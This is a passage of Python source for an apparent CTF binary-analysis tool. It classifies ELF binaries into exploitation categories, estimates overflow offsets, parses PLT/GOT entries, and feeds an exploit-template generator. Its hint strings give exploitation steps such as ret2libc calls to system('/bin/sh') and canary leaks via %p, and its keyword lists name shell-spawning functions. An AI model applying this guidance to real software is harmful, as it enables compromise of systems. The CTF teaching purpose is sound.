    elif has_printf:
        severity = "Low"
    else:
        severity = "Low"

    # Deduplicate evidence
    evidence = list(dict.fromkeys(evidence))[:10]

    return {
        "vulnerable": vulnerable,
        "evidence": evidence,
        "severity": severity,
    }


# ---------------------------------------------------------------------------
# Libc Version Identifier
# ---------------------------------------------------------------------------
# Maps GLIBC minimum versions to likely Ubuntu/Debian releases
_GLIBC_OS_MAP = {
    "2.39": "Ubuntu 24.04 (Noble) / Debian 13",
    "2.38": "Ubuntu 23.10 (Mantic) / Debian Trixie",
    "2.37": "Ubuntu 23.04 (Lunar)",
    "2.36": "Ubuntu 22.10 (Kinetic) / Debian 12",
    "2.35": "Ubuntu 22.04 (Jammy)",
    "2.34": "Ubuntu 21.10 (Impish)",
    "2.33": "Ubuntu 21.04 (Hirsute)",
    "2.31": "Ubuntu 20.04 (Focal) / Debian 11",
    "2.28": "Debian 10 (Buster)",
    "2.27": "Ubuntu 18.04 (Bionic)",
    "2.24": "Debian 9 (Stretch)",
    "2.23": "Ubuntu 16.04 (Xenial)",
    "2.19": "Ubuntu 14.04 (Trusty) / Debian 8",
    "2.17": "CentOS 7 / RHEL 7",
    "2.15": "Ubuntu 12.04 (Precise)",
    "2.12": "CentOS 6 / RHEL 6",
}


def identify_libc(strings: list[str]) -> dict:
    """
    Parse GLIBC version strings and GCC version to identify the likely OS.

    Returns:
        {
            "glibc_version": "2.27",
            "all_versions": ["2.17", "2.23", "2.27"],
            "likely_os": "Ubuntu 18.04 (Bionic)",
            "gcc_version": "7.5.0",
            "libc_db_url": "https://libc.blukat.me/?q=..."
        }
    """
    glibc_re = re.compile(r'GLIBC_(\d+\.\d+)')
    gcc_re = re.compile(r'GCC:\s*\(.*?\)\s*([\d.]+)')

    versions: set[str] = set()
    gcc_version = ""

    for s in strings:
        for m in glibc_re.finditer(s):
            versions.add(m.group(1))
        if not gcc_version:
            gcc_match = gcc_re.search(s)
            if gcc_match:
                gcc_version = gcc_match.group(1)

    if not versions:
        return {
            "glibc_version": None,
            "all_versions": [],
            "likely_os": "Unknown",
            "gcc_version": gcc_version or None,
            "libc_db_url": "",
        }

    sorted_versions = sorted(versions, key=lambda v: tuple(int(x) for x in v.split(".")))
    max_version = sorted_versions[-1]

    # Find the best OS match (exact or closest lower)
    likely_os = "Unknown"
    for ver in sorted(
        _GLIBC_OS_MAP.keys(),
        key=lambda v: tuple(int(x) for x in v.split(".")),
        reverse=True,
    ):
        if tuple(int(x) for x in max_version.split(".")) >= tuple(int(x) for x in ver.split(".")):
            likely_os = _GLIBC_OS_MAP[ver]
            break

    libc_db_url = f"https://libc.blukat.me/?q=__libc_start_main"

    return {
        "glibc_version": max_version,
        "all_versions": sorted_versions,
        "likely_os": likely_os,
        "gcc_version": gcc_version or None,
        "libc_db_url": libc_db_url,
    }


# ---------------------------------------------------------------------------
# CTF Category Detector
# ---------------------------------------------------------------------------
def detect_ctf_category(
    patterns: dict,
    checksec: dict,
    strings: list[str],
    format_string_result: dict | None = None,
    rop_gadgets: list | None = None,
    imports_exports: dict | None = None,
) -> dict:
    """
    Analyze all findings and categorize the binary into the most likely
    CTF exploitation category.

    Categories:
    - ret2win:           No PIE, win function, simple overflow
    - ret2libc:          No PIE, no canary, system/execve in imports
    - format_string:     printf without format arg detected
    - heap_exploitation: malloc/free/UAF patterns
    - stack_canary_bypass: canary present + format string present
    - rop_chain:         NX enabled, no PIE, many gadgets
    - shellcode:         No NX, writable+executable sections

    Returns:
        {"category": str, "confidence": "High"|"Medium"|"Low", "explanation": str}
    """
    nx = checksec.get("nx", True)
    pie = checksec.get("pie", True)
    canary = checksec.get("canary", True)

    has_win = bool(patterns.get("win_conditions")) or any(
        kw in s.lower()
        for s in strings
        for kw in ("win(", "get_flag", "print_flag", "read_flag", "open_flag",
                    "give_shell", "spawn_shell", "cat flag")
    )

    has_dangerous_funcs = bool(patterns.get("dangerous_functions"))
    has_memory_funcs = bool(patterns.get("memory_functions"))
    has_flag_reads = bool(patterns.get("flag_reads"))

    fmt_vuln = format_string_result.get("vulnerable", False) if format_string_result else False
    fmt_severity = format_string_result.get("severity", "Low") if format_string_result else "Low"
    gadget_count = len(rop_gadgets) if rop_gadgets else 0

    # Check for system/execve in imports
    imports = (imports_exports or {}).get("imports", [])
    has_system = any(fn in ("system", "execve", "execvp", "popen") for fn in imports)

    # --- Scoring each category ---
    scores: dict[str, tuple[int, str, str]] = {}  # category -> (score, confidence, explanation)

    # ret2win
    if has_win and not pie:
        score = 90 if has_dangerous_funcs else 70
        conf = "High" if score >= 80 else "Medium"
        scores["ret2win"] = (score, conf,
            "Win/flag function detected with no PIE — overflow the return address to jump directly to the win function.")

    # ret2libc
    if has_system and not pie and not canary:
        score = 85 if has_dangerous_funcs else 65
        conf = "High" if score >= 80 else "Medium"
        scores["ret2libc"] = (score, conf,
            "system()/execve() available with no PIE and no stack canary — classic ret2libc: overflow to call system(\"/bin/sh\").")

    # format_string
    if fmt_vuln:
        score = 90 if fmt_severity == "High" else 70
        conf = "High" if fmt_severity == "High" else "Medium"
        scores["format_string"] = (score, conf,
            "Format string vulnerability detected — use %p to leak addresses, %n to write arbitrary values.")

    # heap_exploitation
    if has_memory_funcs:
        malloc_count = sum(1 for s in strings if "malloc" in s.lower())
        free_count = sum(1 for s in strings if "free" in s.lower())
        has_menu = bool(patterns.get("menu_driven"))
        if malloc_count >= 1 and free_count >= 1:
            score = 80 if has_menu else 60
            conf = "High" if has_menu else "Medium"
            scores["heap_exploitation"] = (score, conf,
                "malloc/free patterns detected (likely use-after-free or heap overflow). "
                + ("Menu-driven interface suggests interactive heap exploitation." if has_menu else "Look for dangling pointers and double-free."))

    # stack_canary_bypass
    if canary and fmt_vuln:
        score = 80
        conf = "High"
        scores["stack_canary_bypass"] = (score, conf,
            "Stack canary is present but format string vulnerability can leak it — read the canary with %p, then overflow past it.")

    # rop_chain
    if nx and not pie and gadget_count >= 3:
        score = 75 if gadget_count >= 8 else 60
        conf = "High" if gadget_count >= 8 else "Medium"
        scores["rop_chain"] = (score, conf,
            f"NX enabled (no shellcode) with no PIE and {gadget_count} ROP gadgets found — build a ROP chain to call system or execve.")

    # shellcode
    if not nx:
        score = 75 if has_dangerous_funcs else 55
        conf = "High" if has_dangerous_funcs else "Medium"
        scores["shellcode"] = (score, conf,
            "NX is disabled — the stack is executable. Inject shellcode directly via a buffer overflow.")

    if not scores:
        return {
            "category": "unknown",
            "confidence": "Low",
            "explanation": "Could not confidently determine the CTF exploitation category. Try manual analysis with checksec and gdb.",
        }

    # Pick the highest-scoring category
    best_cat = max(scores, key=lambda k: scores[k][0])
    _, best_conf, best_expl = scores[best_cat]

    return {
        "category": best_cat,
        "confidence": best_conf,
        "explanation": best_expl,
    }


def detect_ctf_category_from_source(code: str, language: str, vulnerabilities: list) -> dict:
    code_lower = code.lower()
    
    # ret2win - look for a win/flag function definition
    if "void win(" in code_lower or "def win(" in code_lower or "win_function" in code_lower or "print_flag" in code_lower or "getflag" in code_lower:
        return {
            "category": "ret2win",
            "confidence": "High",
            "explanation": "A win/flag function exists in the source code. The exploit goal is to redirect execution to this function."
        }
    
    # format_string - printf with variable instead of format string
    if language in ("c", "cpp") and ("printf(" in code_lower):
        import re
        # Look for printf(variable) pattern without explicit format string
        if re.search(r'printf\s*\(\s*[a-z_][a-z0-9_]*\s*\)', code_lower):
            return {
                "category": "format_string",
                "confidence": "High",
                "explanation": "printf() is called with a variable directly instead of a format string literal. This is a classic format string vulnerability."
            }
    
    # ret2libc - system() or execve() called, or referenced as dangerous
    if "system(" in code_lower or "execve(" in code_lower or "/bin/sh" in code_lower:
        return {
            "category": "ret2libc",
            "confidence": "Medium",
            "explanation": "system() or shell execution is present. Combined with a buffer overflow, this enables ret2libc or direct command execution."
        }
    
    # heap_exploitation - malloc/free patterns suggesting UAF or double-free
    if ("malloc(" in code_lower or "free(" in code_lower) and (code_lower.count("free(") >= 2 or "malloc(" in code_lower and "free(" in code_lower):
        return {
            "category": "heap_exploitation",
            "confidence": "Medium",
            "explanation": "Multiple malloc/free calls detected. Check for use-after-free or double-free vulnerabilities."
        }
    
    # shellcode - check for raw buffer writes without execution protection mentioned
    if "mprotect" in code_lower or "shellcode" in code_lower or "execve" in code_lower:
        return {
            "category": "shellcode",
            "confidence": "Low",
            "explanation": "Code suggests direct memory execution may be possible. Verify NX/DEP status."
        }
    
    # rop_chain - default for buffer overflow vulnerabilities without other category
    has_overflow = any(v.get("type") == "buffer_overflow" for v in vulnerabilities)
    if has_overflow:
        return {
            "category": "rop_chain",
            "confidence": "Medium",
            "explanation": "A buffer overflow exists but no obvious win function or system() call. Likely requires building a ROP chain."
        }
    
    return {
        "category": "unknown",
        "confidence": "Low",
        "explanation": "Could not determine a specific CTF category from the source code alone."
    }


def predict_difficulty_from_source(vulnerabilities: list, ctf_category: dict, code: str) -> dict:
    severity_count = sum(1 for v in vulnerabilities if v.get("severity") == "Critical")
    has_win_function = ctf_category.get("category") == "ret2win"
    has_input_validation = "if (" in code.lower() and ("len(" in code.lower() or "strlen(" in code.lower() or "sizeof(" in code.lower())
    
    if has_win_function and not has_input_validation:
        difficulty = "Easy"
        reason = "Win function present, no input validation detected"
    elif severity_count >= 2:
        difficulty = "Hard"
        reason = f"{severity_count} critical vulnerabilities require chaining multiple techniques"
    elif severity_count == 1:
        difficulty = "Medium"
        reason = "Single critical vulnerability identified, exploit path moderately complex"
    else:
        difficulty = "Medium"
        reason = "Vulnerabilities present but exploitation path unclear from source alone"
    
    return {"difficulty": difficulty, "reason": reason}


def calculate_cvss_score_from_source(vulnerabilities: list, ctf_category: dict, code: str) -> dict:
    vuln_score = 0.0
    
    # 1. Number and severity of vulnerabilities
    for v in vulnerabilities:
        sev = v.get("severity", "Low")
        if sev == "Critical":
            vuln_score += 4.0
        elif sev == "High":
            vuln_score += 3.0
        elif sev == "Medium":
            vuln_score += 2.0
        else:
            vuln_score += 1.0
            
    # If no vulnerabilities found but category identified, set default base score
    if not vulnerabilities:
        cat = ctf_category.get("category", "unknown")
        if cat != "unknown":
            vuln_score += 3.0
            
    # 2. Adjustments based on authentication and user interaction patterns in code
    code_lower = code.lower()
    
    requires_auth = any(p in code_lower for p in ("login", "auth", "password", "admin", "token", "credentials"))
    if requires_auth:
        vuln_score -= 1.0
        
    has_user_interaction = any(p in code_lower for p in ("input(", "scanf(", "cin >>", "gets(", "fgets(", "read("))
    if has_user_interaction:
        vuln_score -= 0.5
        
    # Category adjustments
    cat = ctf_category.get("category", "unknown")
    if cat in ("ret2win", "format_string", "ret2libc"):
        vuln_score += 1.5
    elif cat in ("heap_exploitation", "rop_chain", "shellcode"):
        vuln_score += 1.0
        
    score = max(0.0, min(vuln_score, 10.0))
    
    if score >= 9.0:
        severity = "Critical"
    elif score >= 7.0:
        severity = "High"
    elif score >= 4.0:
        severity = "Medium"
    elif score > 0.0:
        severity = "Low"
    else:
        severity = "None"
        
    return {
        "cvss_score": round(score, 1),
        "cvss_severity": severity,
    }


def analyze_data_flow_from_source(code: str, language: str) -> list:
    import re
    flows = []
    lines = code.split("\n")
    
    input_functions = {
        "c": ["gets(", "scanf(", "fgets(", "read("],
        "cpp": ["cin >>", "gets(", "scanf("],
        "python": ["input(", "sys.argv"],
    }
    
    sink_functions = {
        "c": ["strcpy(", "system(", "exec(", "printf("],
        "cpp": ["system(", "exec("],
        "python": ["eval(", "exec(", "os.system(", "subprocess"],
    }
    
    lang_inputs = input_functions.get(language, [])
    lang_sinks = sink_functions.get(language, [])
    
    for i, line in enumerate(lines):
        for input_fn in lang_inputs:
            if input_fn in line:
                # find variable being assigned
                var_match = re.search(r'(\w+)\s*[,)]', line)
                var_name = var_match.group(1) if var_match else "input"
                
                # search forward for that variable reaching a sink
                for j in range(i, min(i + 15, len(lines))):
                    for sink_fn in lang_sinks:
                        if sink_fn in lines[j] and var_name in lines[j]:
                            flows.append(
                                f"Line {i+1}: Input read via {input_fn.strip('(')} into '{var_name}' → "
                                f"Line {j+1}: reaches {sink_fn.strip('(')} with no visible bounds check → "
                                f"potential vulnerability"
                            )
                            break
    
    return flows if flows else ["No clear input-to-sink data flow detected in static analysis of source"]


def predict_overflow_offset_from_source(code: str, language: str) -> dict:
    import re
    
    if language not in ("c", "cpp"):
        return {"likely_offset": None, "confidence": "N/A", "evidence": "Offset prediction only applies to C/C++"}
    
    # Find buffer declarations like: char buf[64]; or char name[32];
    buffer_pattern = re.findall(r'char\s+(\w+)\s*\[\s*(\d+)\s*\]', code)
    
    if not buffer_pattern:
        return {"likely_offset": None, "confidence": "Low", "evidence": "No fixed-size char buffer declarations found"}
    
    # Take the largest buffer as the most likely overflow target
    largest = max(buffer_pattern, key=lambda x: int(x[1]))
    var_name, size = largest
    
    # Check if this buffer is used with a known dangerous function
    if f"gets({var_name})" in code or f"gets( {var_name} )" in code:
        confidence = "High"
        evidence = f"Buffer '{var_name}' declared as {size} bytes, used directly with gets() — no bounds checking"
    else:
        confidence = "Medium"
        evidence = f"Buffer '{var_name}' declared as {size} bytes — exact offset depends on stack layout and padding"
    
    return {
        "likely_offset": int(size),
        "confidence": confidence,
        "evidence": evidence,
        "buffer_name": var_name
    }


# ---------------------------------------------------------------------------
# Buffer Overflow Offset Predictor
# ---------------------------------------------------------------------------
def predict_overflow_offset(disassembly: list[dict]) -> dict:
    """
    Scan disassembly for stack frame allocation (sub rsp/esp, 0xXX) to
    estimate the likely buffer overflow offset.

    Returns:
        {
            "likely_offset": int | None,
            "stack_size": int | None,
            "confidence": "High" | "Medium" | "Low",
            "evidence": str
        }
    """
    sub_re = re.compile(r'(r|e)sp,\s*0x([0-9a-fA-F]+)')

    best_size = 0
    best_addr = ""

    for insn in disassembly:
        mn = insn.get("mnemonic", "").lower()
        op = insn.get("op_str", "")
        addr = insn.get("address", "")

        if mn == "sub":
            m = sub_re.search(op)
            if m:
                try:
                    size = int(m.group(2), 16)
                    # Skip tiny allocations (alignment) and huge ones (unlikely single buffer)
                    if 0x10 <= size <= 0x1000 and size > best_size:
                        best_size = size
                        best_addr = addr
                except ValueError:
                    continue

    if best_size == 0:
        return {
            "likely_offset": None,
            "stack_size": None,
            "confidence": "Low",
            "evidence": "No stack allocation (sub rsp/esp) found in disassembly.",
        }

    # The offset to overwrite the return address is typically:
    # stack_size + 8 (saved RBP) for 64-bit, stack_size + 4 for 32-bit
    # We'll estimate 64-bit by default (most common in CTFs)
    offset = best_size + 8  # saved rbp + return address starts here

    # Confidence based on whether the allocation is a "nice" size
    if best_size in (0x20, 0x30, 0x40, 0x50, 0x60, 0x70, 0x80, 0x100, 0x200):
        confidence = "High"
    elif best_size % 0x10 == 0:
        confidence = "Medium"
    else:
        confidence = "Low"

    return {
        "likely_offset": offset,
        "stack_size": best_size,
        "confidence": confidence,
        "evidence": f"sub rsp, 0x{best_size:x} found at {best_addr} — buffer is likely {best_size} bytes, offset to RIP ≈ {offset}",
    }


# ---------------------------------------------------------------------------
# PLT / GOT Table Parser
# ---------------------------------------------------------------------------
def get_plt_got(content: bytes) -> dict:
    """
    Parse PLT and GOT entries from an ELF binary using pyelftools.

    Returns:
        {
            "plt": [{"name": "puts", "address": "0x401030"}, ...],
            "got": [{"name": "puts", "address": "0x404018"}, ...]
        }
    """
    result = {"plt": [], "got": []}

    if not content.startswith(b"\x7fELF"):
        return result

    try:
        from elftools.elf.elffile import ELFFile
        from elftools.elf.relocation import RelocationSection
        import io as _io

        elf = ELFFile(_io.BytesIO(content))

        # --- Parse PLT ---
        # The .rela.plt (or .rel.plt) section maps PLT entries to symbol names
        for section_name in ('.rela.plt', '.rel.plt'):
            relplt = elf.get_section_by_name(section_name)
            if relplt and isinstance(relplt, RelocationSection):
                symtab = elf.get_section(relplt['sh_link'])
                for rel in relplt.iter_relocations():
                    sym = symtab.get_symbol(rel['r_info_sym'])
                    name = sym.name if sym and sym.name else f"unknown_{rel['r_offset']:x}"
                    if name:
                        result["got"].append({
                            "name": name,
                            "address": f"0x{rel['r_offset']:x}",
                        })

        # --- Parse PLT section addresses ---
        plt_section = elf.get_section_by_name('.plt')
        plt_sec_section = elf.get_section_by_name('.plt.sec')  # newer GCC
        plt_got_section = elf.get_section_by_name('.plt.got')

        # Use the PLT section with the best data
        target_plt = plt_sec_section or plt_section
        if target_plt:
            plt_addr = target_plt['sh_addr']
            plt_size = target_plt['sh_size']
            entry_size = target_plt['sh_entsize'] or 16  # default PLT entry = 16 bytes

            # Build PLT entries — first entry is the resolver, skip it
            got_names = [g["name"] for g in result["got"]]
            for i, name in enumerate(got_names):
                addr = plt_addr + (i + 1) * entry_size
                if addr < plt_addr + plt_size:
                    result["plt"].append({
                        "name": name,
                        "address": f"0x{addr:x}",
                    })

        # Cap results
        result["plt"] = result["plt"][:50]
        result["got"] = result["got"][:50]

    except Exception as e:
        logger.warning("PLT/GOT parsing failed: %s", e)

    return result


# ---------------------------------------------------------------------------
# Difficulty Predictor
# ---------------------------------------------------------------------------
def predict_difficulty(checksec: dict, patterns: dict, ctf_category: dict) -> dict:
    """
    Predict CTF challenge difficulty based on binary protections and patterns.

    Scoring:
    - No PIE + No Canary + No NX = Easy
    - PIE disabled + Canary or NX = Medium
    - Full RELRO + PIE + Canary + NX = Hard

    Returns:
        {"difficulty": "Easy"|"Medium"|"Hard", "score": int, "reason": str}
    """
    nx = checksec.get("nx", True)
    pie = checksec.get("pie", True)
    canary = checksec.get("canary", True)
    relro = checksec.get("relro", True)

    # Count enabled protections
    score = 0
    reasons_hard = []
    reasons_easy = []

    if nx:
        score += 1
        reasons_hard.append("NX enabled")
    else:
        reasons_easy.append("NX disabled (stack executable)")

    if pie:
        score += 2  # PIE is the hardest to bypass
        reasons_hard.append("PIE enabled")
    else:
        reasons_easy.append("No PIE (fixed addresses)")

    if canary:
        score += 1
        reasons_hard.append("Stack canary present")
    else:
        reasons_easy.append("No stack canary")

    if relro:
        score += 1
        reasons_hard.append("RELRO enabled")
    else:
        reasons_easy.append("No RELRO (GOT writable)")

    # Category-based adjustments
    category = ctf_category.get("category", "unknown")
    if category in ("ret2win",):
        score = max(0, score - 1)  # ret2win is inherently simpler
    elif category in ("heap_exploitation", "stack_canary_bypass"):
        score += 1  # these are inherently harder

    # Determine difficulty
    if score <= 1:
        difficulty = "Easy"
        reason = " • ".join(reasons_easy) if reasons_easy else "Minimal protections"
    elif score <= 3:
        difficulty = "Medium"
        combined = reasons_easy + reasons_hard
        reason = " • ".join(combined[:3]) if combined else "Some protections enabled"
    else:
        difficulty = "Hard"
        reason = " • ".join(reasons_hard) if reasons_hard else "Full protections enabled"

    return {
        "difficulty": difficulty,
        "score": score,
        "reason": reason,
    }


# ---------------------------------------------------------------------------
# Single-file analysis helper
# ---------------------------------------------------------------------------
def _analyze_single_file(
    content: bytes,
    filename: str,
    ext: str,
    detected_type: str = "",
    skip_virustotal: bool = False,
    hints_override: dict | None = None,
) -> dict:
    """
    Analyze a single binary file's content.  Writes to a temp file, extracts
    strings, detects patterns/flags, and generates AI hints.
    The temp file is ALWAYS deleted after processing.

    skip_virustotal: if True, VirusTotal submission is skipped entirely.
    """
    tmp_path: str | None = None
    try:
        suffix = ext if ext else ".bin"
        fd, tmp_path = tempfile.mkstemp(suffix=suffix, dir=tempfile.gettempdir())
        os.write(fd, content)
        os.close(fd)

        strings = _run_strings(tmp_path)
        patterns = detect_patterns(strings)
        flags = detect_flags(strings)
        risk = calculate_risk_score(patterns, flags)
        encodings = detect_encodings(strings)

        # VirusTotal: optional — only submit if requested by the client
        if skip_virustotal:
            vt_result = {"status": "disabled", "message": "VirusTotal scan was skipped."}
        else:
            vt_result = submit_virustotal(content, filename)

        # Checksec: detect binary security protections
        checksec_result = run_checksec(tmp_path)

        # Hex view: first 512 bytes
        hex_view = get_hex_view(content)

        # Disassembly: main function or entry point
        disasm_result = disassemble_binary(content)
        disassembly = disasm_result.get("instructions", [])
        disassembly_function = disasm_result.get("function", "")

        # Deep static analysis for ELFs
        function_list = []
        imports_exports = {"imports": [], "exports": []}
        data_flows = []
        cvss = {"cvss_score": 0.0, "cvss_severity": "None"}

        if ext in (".elf", ".so", "") and content.startswith(b"\x7fELF"):
            try:
                elffile = ELFFile(io.BytesIO(content))
                function_list = get_function_list(elffile)
                imports_exports = get_imports_exports(elffile)
                data_flows = analyze_data_flow(disassembly, patterns)
                cvss = calculate_cvss_score(patterns, flags, checksec_result)
            except Exception as e:
                logger.warning("Failed to parse ELF for deep analysis: %s", e)

        # CTF-focused analysis modules
        rop_gadgets = find_rop_gadgets(content)
        format_string = detect_format_string(strings, patterns)
        libc_info = identify_libc(strings)
        ctf_category = detect_ctf_category(
            patterns, checksec_result, strings,
            format_string_result=format_string,
            rop_gadgets=rop_gadgets,
            imports_exports=imports_exports,
        )

        # Overflow offset prediction, PLT/GOT, and difficulty
        overflow_hint = predict_overflow_offset(disassembly)
        plt_got = get_plt_got(content)
        difficulty = predict_difficulty(checksec_result, patterns, ctf_category)

        # AI hints — search knowledge base for similar writeups and pass writeup_context
        writeup_context = ""
        similar_writeups = []
        if ctf_knowledge:
            try:
                analysis_so_far = {
                    "ctf_category": ctf_category,
                    "patterns": patterns,
                    "checksec": checksec_result,
                    "filename": filename
                }
                similar_writeups = ctf_knowledge.find_similar_writeups(analysis_so_far)
                writeup_context = ctf_knowledge.format_for_ai_context(similar_writeups)
            except Exception as e:
                print(f"[BinExplain] KB search failed: {e}")

        hints = get_ai_hints(strings, patterns, writeup_context, ctf_category=ctf_category, checksec=checksec_result)

        # If parallel hints were pre-computed, override
        if hints_override is not None:
            hints = hints_override["merged"]
            hints_quick = hints_override.get("quick")
            hints_enhanced = hints_override.get("enhanced")
        else:
            hints_quick = None
            hints_enhanced = None

        # AI decompilation hints — explain disassembly using AI
        decompilation_hints = get_decompilation_hints(
            disassembly, strings, ctf_category=ctf_category,
        )

        # Pwntools exploit template — uses predicted offset, ROP gadgets, libc info
        pwn_template = generate_pwn_template(
            filename, content, checksec_result, patterns, strings,
            overflow_hint=overflow_hint,
            rop_gadgets=rop_gadgets,
            libc_info=libc_info,
        )

        result = {
            "filename": filename,
            "size_bytes": len(content),
            "extension": ext or "(none)",
            "strings_count": len(strings),
            "strings": strings,
            "patterns": patterns,
            "flags_detected": flags,
            "hints": hints,
            "ai_hints": hints,
            "ai_hints_quick": hints_quick,
            "ai_hints_enhanced": hints_enhanced,
            "cvss_score": cvss["cvss_score"],
            "cvss_severity": cvss["cvss_severity"],
            "encodings": encodings,
            "virustotal": vt_result,
            "checksec": checksec_result,
            "hex_view": hex_view,
            "pwn_template": pwn_template,
            "disassembly": disassembly,
            "disassembly_function": disassembly_function,
            "decompilation_hints": decompilation_hints,
            "function_list": function_list,
            "imports_exports": imports_exports,
            "data_flows": data_flows,
            "rop_gadgets": rop_gadgets,
            "format_string": format_string,
            "libc_info": libc_info,
            "ctf_category": ctf_category,
            "overflow_hint": overflow_hint,
            "plt_got": plt_got,
            "difficulty": difficulty,
            "similar_writeups": similar_writeups,
        }
        if detected_type:
            result["detected_type"] = detected_type
        return result
    finally:
        if tmp_path and os.path.exists(tmp_path):
            os.unlink(tmp_path)


# ---------------------------------------------------------------------------
# ZIP analysis helper
# ---------------------------------------------------------------------------
def _analyze_zip(
    content: bytes,
    original_filename: str,
    password: str | None = None,
    skip_virustotal: bool = False,
) -> dict:
    """
    Extract a ZIP archive into a temp directory, analyze every binary
    file found inside, and return results for each file.

    Security:
    • Rejects ZIPs > MAX_ZIP_SIZE (10 MB).
    • Rejects ZIPs with > MAX_ZIP_FILES entries (zip-bomb protection).
    • Never executes any extracted file.
    • Always deletes the temp directory in try/finally.
    • Password is NEVER stored or logged — used only for extraction.
    """
    import io

    try:
        zf = zipfile.ZipFile(io.BytesIO(content))
    except zipfile.BadZipFile:
        raise HTTPException(status_code=400, detail="File is not a valid ZIP archive.")

    # ── Detect password-protected ZIP ─────────────────────────────────
    _has_encrypted = any(
        info.flag_bits & 0x1  # bit 0 = encrypted
        for info in zf.infolist()
    )
    if _has_encrypted and not password:
        return JSONResponse(
            status_code=422,
            content={
                "detail": "This ZIP archive is password-protected.",
                "error_code": "password_required",
            },
        )

    # ── Zip-bomb protection ───────────────────────────────────────────
    entries = zf.namelist()
    if len(entries) > MAX_ZIP_FILES:
        raise HTTPException(
            status_code=400,
            detail=f"ZIP contains {len(entries)} files — maximum {MAX_ZIP_FILES} allowed (zip-bomb protection).",
        )

    # Check total uncompressed size
    total_uncompressed = sum(info.file_size for info in zf.infolist())
    if total_uncompressed > MAX_ZIP_SIZE:
        raise HTTPException(
            status_code=400,
            detail=f"ZIP uncompressed size ({total_uncompressed // (1024 * 1024)} MB) exceeds the {MAX_ZIP_SIZE // (1024 * 1024)} MB limit.",
        )

    tmp_dir: str | None = None
    try:
        tmp_dir = tempfile.mkdtemp(prefix="binexplain_zip_", dir=tempfile.gettempdir())

        # Extract with optional password
        pwd_bytes = password.encode("utf-8") if password else None
        try:
            zf.extractall(tmp_dir, pwd=pwd_bytes)
        except NotImplementedError:
            # stdlib zipfile can't handle AES encryption (compress_type 99).
            # Fall back to pyzipper which supports AES decryption.
            try:
                import pyzipper
            except ImportError:
                raise HTTPException(
                    status_code=400,
                    detail="This ZIP uses AES encryption which requires the 'pyzipper' package. Please install it.",
                )
            try:
                pzf = pyzipper.AESZipFile(io.BytesIO(content))
                pzf.extractall(tmp_dir, pwd=pwd_bytes)
            except RuntimeError as exc:
                exc_msg = str(exc).lower()
                if "password" in exc_msg or "bad password" in exc_msg or "wrong password" in exc_msg or "crc" in exc_msg:
                    if password:
                        return JSONResponse(
                            status_code=422,
                            content={
                                "detail": "Incorrect password for this ZIP archive.",
                                "error_code": "wrong_password",
                            },
                        )
                    else:
                        return JSONResponse(
                            status_code=422,
                            content={
                                "detail": "This ZIP archive is password-protected.",
                                "error_code": "password_required",
                            },
                        )
                raise HTTPException(status_code=400, detail=f"Failed to extract ZIP: {str(exc)[:200]}")
            except Exception as exc:
                exc_msg = str(exc).lower()
                if "password" in exc_msg or "bad password" in exc_msg or "wrong password" in exc_msg:
                    if password:
                        return JSONResponse(
                            status_code=422,
                            content={
                                "detail": "Incorrect password for this ZIP archive.",
                                "error_code": "wrong_password",
                            },
                        )
                    else:
                        return JSONResponse(
                            status_code=422,
                            content={
                                "detail": "This ZIP archive is password-protected.",
                                "error_code": "password_required",
                            },
                        )
                raise
        except RuntimeError as exc:
            # zipfile raises RuntimeError for wrong password / missing password
            exc_msg = str(exc).lower()
            if "password" in exc_msg or "bad password" in exc_msg or "encrypted" in exc_msg:
                if password:
                    return JSONResponse(
                        status_code=422,
                        content={
                            "detail": "Incorrect password for this ZIP archive.",
                            "error_code": "wrong_password",
                        },
                    )
                else:
                    return JSONResponse(
                        status_code=422,
                        content={
                            "detail": "This ZIP archive is password-protected.",
                            "error_code": "password_required",
                        },
                    )
            raise HTTPException(status_code=400, detail=f"Failed to extract ZIP: {str(exc)[:200]}")
        except Exception as exc:
            # pyzipper or other extraction errors for wrong password
            exc_msg = str(exc).lower()
            if "password" in exc_msg or "bad password" in exc_msg or "wrong password" in exc_msg:
                if password:
                    return JSONResponse(
                        status_code=422,
                        content={
                            "detail": "Incorrect password for this ZIP archive.",
                            "error_code": "wrong_password",
                        },
                    )
                else:
                    return JSONResponse(
                        status_code=422,
                        content={
                            "detail": "This ZIP archive is password-protected.",
                            "error_code": "password_required",
                        },
                    )
            raise
        finally:
            # Clear password from memory immediately after extraction
            pwd_bytes = None

        results: list[dict] = []
        source_code_results: list[dict] = []
        skipped: list[dict] = []

        MAX_SOURCE_FILES_IN_ZIP = 3  # Cap AI calls for source code files

        for entry in entries:
            entry_path = os.path.join(tmp_dir, entry)

            # Skip directories
            if os.path.isdir(entry_path):
                continue

            # Read file content
            try:
                with open(entry_path, "rb") as f:
                    file_content = f.read()
            except (OSError, IOError):
                skipped.append({"filename": entry, "reason": "Could not read file."})
                continue

            if len(file_content) == 0:
                skipped.append({"filename": entry, "reason": "File is empty."})
                continue

            if len(file_content) > MAX_FILE_SIZE:
                skipped.append({"filename": entry, "reason": "File exceeds 5 MB limit."})
                continue

            # Determine extension and validate
            inner_ext = Path(entry).suffix.lower()
            detected_type = ""

            if inner_ext == "":
                # Extensionless — try magic byte detection
                try:
                    detected_type = _detect_type_from_magic(file_content)
                except HTTPException:
                    skipped.append({"filename": entry, "reason": "Unknown file type (no extension, no known magic bytes)."})
                    continue
            elif inner_ext == ".zip":
                skipped.append({"filename": entry, "reason": "Nested ZIP archives are not supported."})
                continue
            elif inner_ext in SOURCE_CODE_EXTENSIONS:
                # ── Source code file detected — analyze with source code engine ──
                if len(source_code_results) >= MAX_SOURCE_FILES_IN_ZIP:
                    skipped.append({"filename": entry, "reason": f"Source code file limit ({MAX_SOURCE_FILES_IN_ZIP}) reached."})
                    continue
                try:
                    code_text = file_content.decode("utf-8", errors="replace")
                    if len(code_text) > MAX_SOURCE_CODE_CHARS:
                        skipped.append({"filename": entry, "reason": f"Source code exceeds {MAX_SOURCE_CODE_CHARS} character limit."})
                        continue
                    src_result = analyze_source_code(code_text, entry)
                    source_code_results.append(src_result)
                except Exception as exc:
                    logger.warning("Failed to analyze source code '%s' from ZIP: %s", entry, exc)
                    skipped.append({"filename": entry, "reason": f"Source code analysis failed: {exc}"})
                continue
            elif inner_ext not in ALLOWED_EXTENSIONS:
                skipped.append({"filename": entry, "reason": f"Extension '{inner_ext}' is not a supported binary format."})
                continue
            else:
                # Validate magic bytes for known formats
                if inner_ext in FILE_SIGNATURES:
                    expected = FILE_SIGNATURES[inner_ext]
                    if not file_content[:len(expected)] == expected:
                        skipped.append({"filename": entry, "reason": f"Magic bytes don't match expected format for '{inner_ext}'."})
                        continue

                # Reject suspicious content for generic extensions
